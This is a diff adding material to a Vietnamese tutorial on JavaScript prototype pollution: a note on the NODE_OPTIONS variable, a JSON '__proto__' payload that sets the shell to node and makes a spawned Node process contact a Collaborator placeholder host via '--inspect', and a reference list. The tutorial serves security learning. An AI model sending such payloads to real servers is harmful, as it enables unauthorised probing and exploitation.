@@ -11,6 +11,15 @@ Trong JavaScript, khái niệm "class" không tồn tại ở cấp độ ngôn 
 
 Sau đó tôi nhận ra rằng localStorage/sessionStorage cũng sẽ kế thừa từ Object.prototype, điều đó có nghĩa là nếu một trang web có lỗ hổng ô nhiễm nguyên mẫu phía máy khách và trang web đó sử dụng phương thức lấy dữ liệu chứ không phải get()phương thức thì có thể kiểm soát giá trị localStorage.
 
+Biến môi trường NODE_OPTIONS cho phép xác định một chuỗi các đối số dòng lệnh sẽ được sử dụng theo mặc định bất cứ khi nào bắt đầu một trình Node mới.
+
+```javascript!
+"__proto__": {
+    "shell":"node",
+    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
+}
+```
+
 ## Khái niệm & Khai thác & Phòng tránh
 
 ### Object trong JavaScript
@@ -1033,3 +1042,10 @@ Giải mã nội dung của cơ thể để khám phá bí mật
 ![image](https://hackmd.io/_uploads/HyOkD4SVkg.png)
 
 ![image](https://hackmd.io/_uploads/SkZgwEBNkl.png)
+
+## Tham khảo
+
+- https://hackmd.io/@Nightcore/H1pbF8UgC?utm_source=preview-mode&utm_medium=rec
+- https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
+- https://sheon.hashnode.dev/web-hacking-prototype-pollution-attack
+- https://payatu.com/blog/prototype-pollution-vulnerabilities/
